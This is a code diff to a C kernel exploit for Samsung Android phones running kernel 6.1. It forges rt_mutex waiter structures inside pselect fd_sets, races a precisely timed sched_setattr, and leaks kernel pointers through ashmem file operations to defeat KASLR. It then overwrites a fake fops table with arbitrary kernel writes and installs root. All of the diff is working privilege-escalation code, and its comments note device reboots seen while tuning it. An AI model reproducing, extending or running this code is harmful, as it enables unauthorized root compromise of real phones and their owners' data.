@@ -43,6 +43,13 @@ uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
 static int route_delay_usec(int attempt) {
+  if (active_offsets && active_offsets->sync_route) {
+    /* Rotate FOPS_DELAY_USEC by one step per route attempt. */
+    static const int fops_delays[] = {70000, 60000, 80000,
+                                      40000, 90000, 50000};
+    static int sync_delay_counter;
+    return fops_delays[sync_delay_counter++ % 6];
+  }
   /* Let select() establish its stack frame before the PI walk. */
   if (pselect_custom_write == 2) {
     return PSELECT_ENTER_DELAY_USEC;
@@ -61,6 +68,94 @@ void fdset_put_word(fd_set *set, int word, uint64_t value) {
   unsigned long *bits = (unsigned long *)set;
   bits[word] = (unsigned long)value;
 }
+
+/* EDEADLK-synchronized pselect phase (Samsung 6.1): runs on the waiter
+ * thread after the handshake.  pselect6 uses a 100ms timeout; the consumer
+ * fires one precisely timed sched_setattr at enter_ts + delay. */
+void sync_pselect_phase(void) {
+  if (!page_base || !fake_lock || !fake_fops) {
+    cfi_last_step = 30;
+    cfi_last_errno = 0;
+    pr_error("sync route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
+             page_base, fake_lock, fake_fops);
+    return;
+  }
+
+  int pipefd[2];
+  SYSCHK(pipe(pipefd));
+  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+  if (block_fd < 0) {
+    pr_warning("sync route timerfd_create failed errno=%d; using pipe read end\n",
+               errno);
+    block_fd = pipefd[0];
+  }
+  int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+  if (high_read < 0) {
+    cfi_last_step = 31;
+    cfi_last_errno = errno;
+    pr_error("sync route F_DUPFD read errno=%d\n", errno);
+    if (block_fd != pipefd[0]) {
+      close(block_fd);
+    }
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+
+  fd_set in;
+  fd_set out;
+  fd_set ex;
+  prepare_pselect_fdsets(&in, &out, &ex);
+  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
+  pr_info("sync pselect fds ready high_read=%d block_fd=%d pipe_r=%d pipe_w=%d nfds=%d\n",
+          high_read, block_fd, pipefd[0], pipefd[1], PSELECT_ROUTE_NFDS);
+
+  struct timespec timeout = { .tv_sec = 0, .tv_nsec = 100000000L };
+  atomic_store(&gk_pselect_entered, 1);
+  atomic_store(&gk_enter_ts, mono_ns());
+  errno = 0;
+  int ret = (int)syscall(SYS_pselect6, PSELECT_ROUTE_NFDS, &in, &out, &ex,
+                         &timeout, NULL);
+  int saved_errno = errno;
+  pr_info("sync pselect syscall returned ret=%d errno=%d\n", ret, saved_errno);
+  pr_info("sync pselect post begin ret=%d route=%d fire=%d\n",
+          ret, atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
+  atomic_store(&gk_pselect_entered, 0);
+  pr_info("sync pselect post cleared entered route=%d fire=%d\n",
+          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
+
+  /* Give the owner a 200ms settle window; the consumer sets route_done
+   * right after firing. */
+  pr_info("sync pselect settle begin route=%d fire=%d\n",
+          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
+  uint64_t deadline = mono_ns() + 200000000ULL;
+  while (!atomic_load(&gk_route_done) && mono_ns() < deadline) {
+    usleep(1000);
+  }
+  pr_info("sync pselect settle done route=%d fire=%d\n",
+          atomic_load(&gk_route_done), atomic_load(&gk_fire_success));
+  int window_hit = (ret > 0) && atomic_load(&gk_fire_success) > 0;
+  atomic_store(&gk_window_hit, window_hit);
+  pr_info("sync route ret=%d errno=%d fire=%d hit=%d\n",
+          ret, saved_errno, atomic_load(&gk_fire_success), window_hit);
+
+  if (window_hit && !pselect_custom_write_enabled()) {
+    if (try_cfi_stage()) {
+      cfi_last_step = 0;
+    } else if (!cfi_last_step) {
+      cfi_last_step = 32;
+    }
+  }
+
+  close(high_read);
+  if (block_fd != pipefd[0]) {
+    close(block_fd);
+  }
+  close(pipefd[0]);
+  close(pipefd[1]);
+}
+
+
 
 uint64_t fdset_get_word(const fd_set *set, int word) {
   const unsigned long *bits = (const unsigned long *)set;
@@ -144,7 +239,34 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     int word;
     uint64_t value;
     const char *name;
-  } words[] = {
+  };
+  uint64_t waiter_task =
+    pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK);
+  if (WAITER_COMPACT) {
+    /* 6.1 compact rt_mutex_waiter (0x58): tree_entry 0x00, pi_tree_entry
+     * 0x18, task 0x30, lock 0x38, wake_state+prio 0x40, deadline 0x48,
+     * ww_ctx 0x50.  Word index = byte offset / 8 + 2. */
+    struct pselect_waiter_word words[] = {
+      {2, 0, "tree_pc"},
+      {3, 0, "tree_right"},
+      {4, 0, "tree_left"},
+      {5, 0, "pi_parent"},
+      {6, 0, "pi_right"},
+      {7, 0, "pi_left"},
+      {8, waiter_task, "task"},
+      {9, fake_lock, "lock"},
+      {10, 3ULL | (1ULL << 32), "wake_state+prio"},
+      {11, 0, "deadline"},
+      {12, 0, "ww_ctx"},
+    };
+    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
+      struct pselect_waiter_word *w = &words[i];
+      pselect_put_waiter_word(
+          in, out, ex, words_per_set, w->word, w->value, w->name);
+    }
+    return;
+  }
+  struct pselect_waiter_word words[] = {
     {2, 0, "tree_pc"},
     {3, 0, "tree_right"},
     {4, 0, "tree_left"},
@@ -155,7 +277,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {9, 0, "pi_left"},
     {10, 1, "pi_prio"},
     {11, 0, "pi_deadline"},
-    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
+    {12, waiter_task,
      "task"},
     {13, fake_lock, "lock"},
     {14, 3, "wake_state"},
@@ -241,6 +363,7 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_stop, 0);
     int delay_usec = route_delay_usec(route_attempt);
     atomic_store(&main_route_delay_usec, delay_usec);
+    atomic_store(&gk_enter_ts, 0);
     atomic_store(&punch_consume_go, route_attempt);
 
     struct timeval timeout = {
@@ -254,6 +377,7 @@ void do_pselect_fake_lock_route(void) {
 
     pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
     errno = 0;
+    atomic_store(&gk_enter_ts, mono_ns());
     int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
     int saved_errno = errno;
     pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
@@ -347,9 +471,47 @@ int refresh_fake_fops_text(int fd) {
 
   for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
     uintptr_t target = fake_fops + slots[i].off;
-    if (kernel_write_data(fd, target, &slots[i].value,
-        sizeof(slots[i].value)) !=
-        (ssize_t)sizeof(slots[i].value)) {
+    if (!is_direct_ptr(target) || !is_kernel_ptr(slots[i].value)) {
+      pr_error("cfi fops refresh invalid slot=%zu off=%zx target=%016zx "
+               "value=%016llx\n",
+               i, slots[i].off, target,
+               (unsigned long long)slots[i].value);
+      return 0;
+    }
+    pr_info("cfi fops refresh begin slot=%zu off=%zx target=%016zx "
+            "value=%016llx len=%zu\n",
+            i, slots[i].off, target, (unsigned long long)slots[i].value,
+            sizeof(slots[i].value));
+
+    /* The sprayed table already contains the slide-adjusted open pointer.
+     * This fd is open before misc_fops is redirected to fake_fops, and the
+     * UMH path never opens it again.  Rewriting this field is unnecessary and
+     * is the only refresh write that has rebooted the phone (shell21). */
+    if (slots[i].off == FOPS_OPEN_OFF) {
+      uint64_t existing = 0;
+      errno = 0;
+      ssize_t rd = kernel_read_data(fd, target, &existing, sizeof(existing));
+      int read_errno = errno;
+      pr_info("cfi fops open preflight target=%016zx ret=%zd value=%016llx "
+              "want=%016llx errno=%d\n",
+              target, rd, (unsigned long long)existing,
+              (unsigned long long)slots[i].value, read_errno);
+      if (rd == (ssize_t)sizeof(existing) && existing == slots[i].value) {
+        pr_info("cfi fops refresh skip slot=%zu off=%zx reason=open-preloaded\n",
+                i, slots[i].off);
+        continue;
+      }
+      pr_warning("cfi fops open preflight mismatch; attempting refresh write\n");
+    }
+
+    errno = 0;
+    ssize_t wr = kernel_write_data(
+        fd, target, &slots[i].value, sizeof(slots[i].value));
+    int write_errno = errno;
+    pr_info("cfi fops refresh end slot=%zu off=%zx target=%016zx ret=%zd "
+            "errno=%d\n",
+            i, slots[i].off, target, wr, write_errno);
+    if (wr != (ssize_t)sizeof(slots[i].value)) {
       return 0;
     }
   }
@@ -358,12 +520,27 @@ int refresh_fake_fops_text(int fd) {
 
 int leak_kernel_base(int fd) {
   kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
+  pr_info("cfi leak start fops_alias=%016zx open_off=%zx ioctl_off=%zx "
+          "mmap_off=%zx release_off=%zx show_fdinfo_off=%zx\n",
+          kaslr_fops_alias, (size_t)FOPS_OPEN_OFF, (size_t)FOPS_IOCTL_OFF,
+          (size_t)FOPS_MMAP_OFF, (size_t)FOPS_RELEASE_OFF,
+          (size_t)FOPS_SHOW_FDINFO_OFF);
   kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
+  pr_info("cfi leak read open=%016llx\n",
+          (unsigned long long)kaslr_open_ptr);
   kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
+  pr_info("cfi leak read ioctl=%016llx\n",
+          (unsigned long long)kaslr_ioctl_ptr);
   kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
+  pr_info("cfi leak read mmap=%016llx\n",
+          (unsigned long long)kaslr_mmap_ptr);
   kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
+  pr_info("cfi leak read release=%016llx\n",
+          (unsigned long long)kaslr_release_ptr);
   kaslr_show_fdinfo_ptr =
     kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
+  pr_info("cfi leak read show_fdinfo=%016llx\n",
+          (unsigned long long)kaslr_show_fdinfo_ptr);
 
   if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
       !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
@@ -379,6 +556,13 @@ int leak_kernel_base(int fd) {
   kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
   kaslr_expected_release = text_addr(ASHMEM_RELEASE);
   kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);
+  pr_info("cfi leak base=%016llx expected ioctl=%016llx mmap=%016llx "
+          "release=%016llx show_fdinfo=%016llx\n",
+          (unsigned long long)kaslr_base,
+          (unsigned long long)kaslr_expected_ioctl,
+          (unsigned long long)kaslr_expected_mmap,
+          (unsigned long long)kaslr_expected_release,
+          (unsigned long long)kaslr_expected_show_fdinfo);
 
   if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
       kaslr_mmap_ptr != kaslr_expected_mmap ||
@@ -389,12 +573,14 @@ int leak_kernel_base(int fd) {
     return 0;
   }
 
+  pr_info("cfi leak pointers verified; refreshing fake fops\n");
   if (!refresh_fake_fops_text(fd)) {
     kaslr_done = 0;
     kaslr_step = 3;
     return 0;
   }
 
+  pr_info("cfi fake fops refresh complete\n");
   kaslr_step = 0;
   return 1;
 }
@@ -420,6 +606,12 @@ int restore_slide_boot_id(int fd) {
 }
 
 int install_child_root(int fd) {
+  /* Use the pipe-backed direct-map R/W path before walking slab-resident
+   * workqueue objects.  Configfs remains the bootstrap channel used by
+   * install_pipe_physrw itself. */
+  if (active_offsets && active_offsets->umh_root) {
+    return install_pipe_physrw(fd) && install_android_root(fd);
+  }
   return install_pipe_physrw(fd) && install_android_root(fd);
 }
 
@@ -548,6 +740,11 @@ int try_cfi_stage(void) {
     configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
   cfi_owner_ret = owner;
   SYSCHK(close(fd));
+  /* Keep the original completion path.  The UMH helper has already detached;
+   * introducing a post-handshake fork/keeper here changes the route-worker
+   * timing and was observed to reboot the Fold6 immediately after the hold
+   * log. */
+  reset_pipe_attempt();
   if (owner == (ssize_t)sizeof(null_owner) &&
       restore == (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 0;
@@ -560,6 +757,7 @@ int try_cfi_stage(void) {
   return 0;
 
 fail:
+  reset_pipe_attempt();
   if (dirty) {
     uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
     if (kaslr_done) {
@@ -582,4 +780,3 @@ fail:
   SYSCHK(close(fd));
   return 0;
 }
-
